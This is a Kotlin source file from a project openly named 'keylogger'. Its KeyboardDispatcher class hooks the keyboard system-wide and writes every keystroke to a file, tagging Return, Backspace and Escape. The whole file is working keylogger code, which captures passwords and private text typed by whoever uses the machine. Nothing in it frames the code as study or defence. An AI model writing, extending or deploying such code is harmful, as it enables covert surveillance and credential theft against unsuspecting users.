package keylogger

import lc.kra.system.keyboard.event.GlobalKeyAdapter
import lc.kra.system.keyboard.event.GlobalKeyEvent
import java.io.IOException

class KeyboardDispatcher : GlobalKeyAdapter() {
    
    override fun keyPressed(event: GlobalKeyEvent) {
        val keyPressed = event.virtualKeyCode
        val append = { c: CharSequence -> JavaKeyboardOperator.fileWriterObject.append(c) }
        
        try {
            when (keyPressed) {
                GlobalKeyEvent.VK_RETURN -> append("\n")
                GlobalKeyEvent.VK_BACK -> append("[BACK]")
                GlobalKeyEvent.VK_ESCAPE -> append("[END]")
                else -> append(event.keyChar.toString())
            }
            JavaKeyboardOperator.fileWriterObject.flush()
        } catch (e: IOException) {
            System.out.printf("Cannot write to %s%n", JavaKeyboardOperator.fileObject.absolutePath)
        } 
    }
}
